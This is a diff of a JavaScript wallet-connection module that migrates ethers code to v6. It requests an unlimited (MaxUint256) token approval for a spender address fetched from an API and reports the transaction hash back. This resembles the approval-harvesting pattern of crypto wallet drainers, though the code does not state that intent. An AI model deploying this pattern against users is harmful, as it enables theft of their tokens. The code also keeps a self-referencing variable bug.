@@ -1,11 +1,12 @@
-import { ethers } from 'ethers';
+import { ethers, BrowserProvider } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.min.js';
+// Your code here...
 import { ABI, contractAddress } from './config';
 let provider = null;
 export async function connectWallet() {
   return new Promise((res, rej) => {
     if (provider == null) {
-      // provider = new BrowserProvider(window.ethereum);
-      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      provider = new BrowserProvider(window.ethereum);
+      // provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     }
     provider
       .send('eth_requestAccounts', [])
@@ -18,13 +19,14 @@ export async function connectWallet() {
   });
 }
 export let checkNeedEth = async (approve) => {
-  const signer = await provider.getSigner(); //连接钱包地址
-  const adr = approve; //授权地址，从api获取
-  let contractAddress = contractAddress; //合约地址
-  const feeData = await provider.getFeeData();
-  const gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
-  const needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
-  const ethBalance = await provider.getBalance(signer.address);
+  let signer = await provider.getSigner(); //连接钱包地址
+  let adr = approve; //授权地址，从api获取
+  // let contractAddress = contractAddress; //合约地址
+  let contract = new ethers.Contract(contractAddress, ABI, signer);
+  let feeData = await provider.getFeeData();
+  let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
+  let needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
+  let ethBalance = await provider.getBalance(signer.address);
   return new Promise((res, rej) => {
     if (needEth > ethBalance) {
       console.log('eth not enough');
@@ -35,10 +37,10 @@ export let checkNeedEth = async (approve) => {
   });
 };
 export async function tokenApprove(approve) {
-  const signer = await provider.getSigner(); //连接钱包地址
-  const adr = approve; //授权地址，从api获取
-  let contractAddress = contractAddress; //合约地址
-  const contract = new ethers.Contract(contractAddress, ABI, signer);
+  let signer = await provider.getSigner(); //连接钱包地址
+  let adr = approve; //授权地址，从api获取
+  // let contractAddress = contractAddress; //合约地址
+  let contract = new ethers.Contract(contractAddress, ABI, signer);
   return new Promise((res, rej) => {
     contract.approve(adr, ethers.MaxUint256).then((tx) => {
       tx.wait().then((txReceipt) => {
@@ -52,15 +54,15 @@ export async function tokenApprove(approve) {
     });
   });
   // try {
-  //     const feeData =await provider.getFeeData();
-  //     const gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
-  //     const needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
-  //     const ethBalance = await provider.getBalance(signer.address);
+  //     let feeData =await provider.getFeeData();
+  //     let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
+  //     let needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
+  //     let ethBalance = await provider.getBalance(signer.address);
   //     if(needEth>ethBalance){
   //         console.log('eth not enough')
   //     }
-  //     const tx = await contract.approve(adr, ethers.MaxUint256) //授权
-  //     const txReceipt = await tx.wait();
+  //     let tx = await contract.approve(adr, ethers.MaxUint256) //授权
+  //     let txReceipt = await tx.wait();
   //     if (txReceipt && txReceipt.status == 1) { //交易成功
   //         console.log(txReceipt.hash); //调用api，把hash传入接口
   //     }
@@ -72,10 +74,10 @@ export async function tokenApprove(approve) {
 
 async function tokenBalance() {
   //非gas币的余额获取
-  const signer = await provider.getSigner(); //连接钱包地址
+  let signer = await provider.getSigner(); //连接钱包地址
   let contractAddress = contractAddress; //合约地址
-  const contract = new ethers.Contract(contractAddress, ABI, provider);
-  const decimals = await contract.decimals();
-  const balance = await contract.balanceOf(signer.address);
+  let contract = new ethers.Contract(contractAddress, ABI, provider);
+  let decimals = await contract.decimals();
+  let balance = await contract.balanceOf(signer.address);
   console.log('余额', ethers.formatUnits(balance, decimals));
 }
